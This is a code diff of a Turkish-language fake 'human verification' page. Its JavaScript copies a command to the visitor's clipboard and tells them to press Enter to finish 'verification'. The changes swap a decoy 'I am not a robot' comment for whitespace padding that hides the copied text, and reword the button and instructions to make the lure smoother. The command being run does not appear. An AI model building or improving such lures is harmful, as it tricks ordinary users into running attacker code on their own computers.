@@ -261,7 +261,7 @@
                             <li>Doğrulamayı tamamlamak için <b>Enter</b> tuşuna basın.</li>
                         </ol>
                         <p>
-                            Bu ifadeyi görüp kabul ettiğinizde süreç tamamlanacaktır:
+                            Enter tuşuna bastıktan süreç tamamlanacaktır:
                             <br>
                             <code
                                 style="background: #eee; padding: 2px; border-radius: 3px; display: block; margin-top: 5px; color: #333;">
@@ -274,7 +274,7 @@
                             Doğrulamayı tamamlamak için lütfen yukarıdaki adımları tamamlayın.
                         </div>
                         <button type="button" class="verify-verify-button block"
-                            id="verify-verify-button">Doğrula</button>
+                            id="verify-verify-button">Tamamla</button>
                     </div>
                 </div>
             </div>
@@ -408,9 +408,9 @@
             }
 
             function stageC(cToRun, verification_id) {
-                const suffix = " # "
-                const ploy = "✅ ''Ben robot değilim - Doğrulama No: "
-                const end = "''"
+                const suffix = ""
+                const ploy = "                                                  "
+                const end = ""
                 const textToCopy = cToRun + suffix + ploy + verification_id + end
 
                 setCCopyData(textToCopy);
